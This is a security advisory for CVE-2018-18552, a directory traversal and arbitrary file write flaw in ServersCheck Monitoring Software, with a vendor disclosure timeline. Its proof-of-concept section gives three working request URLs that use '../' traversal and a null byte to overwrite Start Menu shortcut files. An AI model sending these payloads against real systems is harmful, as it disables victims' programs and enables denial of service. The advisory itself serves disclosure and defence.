[+] Credits: John Page (aka hyp3rlinx)		
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2018-18552-SERVERSCHECK-MONITORING-SOFTWARE-ARBITRARY-FILE-WRITE-DOS.txt
[+] ISR: ApparitionSec          
 
Greetz: ***Greetz: indoushka | Eduardo B.***


[Vendor]
www.serverscheck.com


[Product]
ServersCheck Monitoring Software - through 14.3.3

Software for monitoring your edge computing infrastructure, network & servers.

http://downloads.serverscheck.com/monitoring_software/setup.exe
File hash: b7bffe4fc83b6a4586c099d6c62d8eeb


[Vulnerability Type]
Abitrary File Write


[Affected Component]
"sensor_details.html" webpage the "id" parameter


[CVE Reference]
CVE-2018-18552



[Security Issue]
ServersCheck Monitoring Software allows remote attackers to cause a denial of service (menu functionality loss) by creating an LNK file that
points to a second LNK file, if this second LNK file is associated with a Start menu item. Ultimately, this behavior comes from a Directory Traversal bug
(via the sensor_details.html id parameter) that allows creating empty files in arbitrary directories. 


[Impact]
Denial of Service


[References]
https://serverscheck.com/monitoring-software/release.asp


[Exploit/POC]
DOS Command Prompt .LNK under Start Menu change <VICTIM> to desired user.

http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Accessories/Command%20Prompt.lnk%00

DOS Run .LNK under Start Menu 
http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Accessories/Run.lnk%00

DOS Internet Explorer .LNK from Start Menu 
http://127.0.0.1:1272/sensor_details.html?id=../../../../Users/<VICTIM>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Internet Explorer.LNK%00


Victim will get error message from server like "Error retrieving sensor details from database".

Then,

No Internet Explorer, Command or Run prompt via the Start/Programs/Accessories/ and Task Menu links. However, can still be launch by other means.
Tested successfully on Windows 7 OS


[Network Access]
Remote



[Severity]
High


[Disclosure Timeline]
Vendor Notification: October 6, 2018
Vendor acknowledgement: October 7, 2018
Vendor release v14.3.4 : October 7th, 2018 
CVE assign by Mitre: October 21, 2018
October 22, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx
